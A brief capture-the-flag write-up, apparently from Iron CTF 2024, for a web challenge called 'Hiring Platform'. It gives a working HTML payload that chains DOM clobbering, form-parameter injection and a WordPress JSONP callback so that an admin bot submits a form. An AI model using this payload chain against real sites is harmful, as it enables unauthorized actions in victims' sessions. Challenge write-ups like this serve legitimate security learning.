# Hiring Platform

using dom clobbering to turn on production mode and using html injection to inject a parameter in the form and using jsonp endpoint of wordpress site present in /blog we get make the bot click on the button and get the flag in our account.

```html
<a id="PRODUCTION"></a>
<input type="text" name="remark" value="SELECT NOW!!" form="select_humans">
<iframe srcdoc="<script src='/blog/wp-json/wp/v2/users/1?_jsonp=window.parent.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.submit'>
</script>"></iframe>
```

Detailed Writeup: [Hiring Platform](https://abdulhaq.me/blog/iron-ctf-2024/#web-hiring-platform)
